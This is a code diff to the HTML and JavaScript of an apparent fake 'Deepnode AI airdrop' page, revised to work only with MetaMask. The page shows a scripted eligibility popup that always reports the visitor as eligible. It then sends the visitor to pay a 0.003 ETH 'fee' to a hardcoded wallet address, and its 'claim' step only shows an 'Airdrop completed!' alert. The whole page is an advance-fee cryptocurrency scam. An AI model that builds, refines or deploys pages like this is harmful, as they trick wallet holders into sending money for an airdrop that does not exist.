@@ -53,9 +53,9 @@ button:disabled{opacity:.5; cursor:not-allowed}
 
 <div class="container">
   <img src="deepnode-logo.png" class="logo">
-  <h1>Connect wallet to claim Deepnode AI airdrop</h1>
+  <h1>Connect MetaMask to claim Deepnode AI airdrop</h1>
   <div id="timer" style="margin-bottom:16px;font-size:14px;"></div>
-  <button onclick="connectWallet()">Connect Wallet</button>
+  <button onclick="connectWallet()">Connect MetaMask</button>
   <div class="status" id="status"></div>
   <div class="footer">Deepnode AI • Terms & Privacy</div>
 </div>
@@ -88,19 +88,12 @@ updateTimer();
 
 /* ================= WALLET ================= */
 let currentAddress = "";
-let walletType = "";
-
 async function connectWallet(){
   const statusEl = document.getElementById("status");
-  if(!window.ethereum){
-    statusEl.innerText="Open this page in MetaMask or Trust Wallet DApp browser.";
+  if(!window.ethereum || !window.ethereum.isMetaMask){
+    statusEl.innerText="MetaMask not detected. Please open this page in the MetaMask mobile browser.";
     return;
   }
-
-  // Detect wallet type
-  if(window.ethereum.isMetaMask) walletType="MetaMask";
-  else if(window.ethereum.isTrust) walletType="Trust Wallet";
-  else walletType="Ethereum Wallet";
 
   try{
     const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -108,8 +101,8 @@ async function connectWallet(){
     const signer = provider.getSigner();
     currentAddress = await signer.getAddress();
 
-    statusEl.innerText="Wallet connected: " + currentAddress + " ("+walletType+")";
-    showEligibility(currentAddress, walletType);
+    statusEl.innerText="Wallet connected: " + currentAddress;
+    showEligibility(currentAddress);
 
   }catch{
     statusEl.innerText="Connection rejected.";
@@ -117,7 +110,7 @@ async function connectWallet(){
 }
 
 /* ================= ELIGIBILITY POPUP ================= */
-function showEligibility(address, wallet){
+function showEligibility(address){
   const modal = document.getElementById("modal");
   const bar = document.getElementById("bar");
   const text = document.getElementById("modalText");
@@ -146,12 +139,8 @@ function showEligibility(address, wallet){
       text.innerHTML=`✅ Eligible!<br><br>Ready to claim your airdrop.`;
       addrEl.innerText="Wallet: "+address;
 
-      // Show Pay button only for Ethereum wallets
-      if(wallet==="MetaMask" || wallet==="Trust Wallet" || wallet==="Ethereum Wallet"){
-        payBtn.style.display="block";
-      } else {
-        text.innerHTML += "<br><br>⚠️ This airdrop requires an Ethereum wallet. Please switch to MetaMask or Trust Wallet.";
-      }
+      // Show Pay button only for MetaMask
+      payBtn.style.display="block";
     }
   },500);
 }
@@ -163,21 +152,21 @@ function payFee(){
   const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
   const amountWei = "3000000000000000"; // 0.003 ETH
 
-  // Ethereum deep link (works on MetaMask & Trust Wallet DApp browser)
+  // Ethereum deep link for MetaMask
   const url = `ethereum:${recipient}?value=${amountWei}`;
   window.location.href = url;
 
-  // Unlock claim button
+  // Unlock claim button after payment step
   const claimBtn = document.getElementById("claimBtn");
   claimBtn.style.display="block";
 
-  // Hide pay button to prevent multiple clicks
+  // Hide pay button
   document.getElementById("payBtn").style.display="none";
 }
 
 /* ================= CLAIM AIRDROP ================= */
 function claimAirdrop(){
-  alert("Airdrop claimed!"); // Replace with real action if needed
+  alert("Airdrop completed!"); // Only clickable after payment
 }
 </script>
 
